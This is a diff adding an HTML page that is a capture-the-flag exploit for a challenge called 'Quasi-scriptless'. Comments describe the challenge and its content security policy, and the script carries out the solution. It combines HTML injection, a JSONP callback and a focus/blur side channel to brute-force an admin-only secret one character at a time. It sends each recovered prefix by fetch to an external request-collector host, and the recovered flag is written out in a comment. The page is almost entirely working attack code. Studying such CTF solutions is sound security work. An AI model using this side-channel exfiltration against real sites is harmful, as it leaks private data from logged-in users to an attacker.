@@ -1,0 +1,75 @@
+
+<body>
+
+</body>
+<script>
+
+
+/*
+    Quasi-scriptless (3 solves)
+    
+    Chall:
+    1. The flag was in the body of the page in form of <strike>CTF-BR{flag}</strike> visible only to admin.
+    2. There was a simple HTML Injection endpoint that happened before the flag. 
+    3. The goal was to retrieve that flag by sending a URL to the page to admin.
+
+    Rules:
+    1. CSP: default-src 'none'; script-src 'self'; form-action 'none'; base-uri 'none'; sandbox allow-scripts;
+    2. Blocked characters in HTML Injection: /[:&%#]/
+    3. Allowed characters in JSONP: /^[a-z.]+$/
+
+    Solution:
+    0. Meta redirect (<meta http-equiv="refresh" content="0;//website.com">) to external page.
+    1. Markup dangling in <input id=x value='DANGLED DATA.
+    2. <input id=x pattern="something"> RegExp to retrieve data from value='.
+    3. Callback in JSONP to inject: <script src="/hire?callback=x.reportValidity">.
+    4. x.reportValidity checks if input matches pattern, if no, input will gain focus.
+    5. Detect onblur event.
+*/
+
+const URL = `http://zedd.vv/scriptless/index.php?name=<script defer src="/test.php?callback=x.reportValidity"><\/script><input id=x pattern='!</h1>\\t\\t<font size="5">\\t\\t\\tOur company has been researching defense-in-depth features<br>\\t\\t\\tsuch as the Content Security Policy and we believe to have<br>\\t\\t\\tfound the perfect configuration for its directives.<br><br>\\t\\t\\t<font color="firebrick">\\t\\t\\t\\t<b><strike>CTF-BR\\{PREFIX[^LETTER].*' value='`
+
+let prefix = ''
+let letter = ''
+
+let alph = '0123456789abcdefghijklmnopqrstuvwxyz_'
+
+async function test(prefix, letter){
+    return new Promise(r=>{
+        let x = document.createElement('iframe');
+        document.body.appendChild(x);
+        
+        x.focus();
+        let win = x.contentWindow;
+        let doc = x.contentDocument;
+        win.onblur = () => r(1);
+        let i = doc.createElement('iframe');
+        i.src = URL.replace('PREFIX', prefix).replace('LETTER', letter)
+        doc.documentElement.appendChild(i);
+        i.onload = () => {
+            console.log(/load/);
+            r(0);
+            x.remove();
+        }
+    })
+    
+}
+
+
+async function go(prefix){
+    for(let c of alph){
+        let r = await test(prefix, c);
+        if(r) {
+            prefix += c;
+            fetch('https://enbseepc18ei5.x.pipedream.net/x?f='+prefix)
+            go(prefix);
+            break;
+        }
+    }
+}
+
+// CTF-BR{p4tt3rn5_plu5_f0cu5_3qu4l5_s1de_ch4nn3l}
+// go('p4tt3rn5_plu5_f0cu5_3qu4l5_')
+go()
+
+</script>
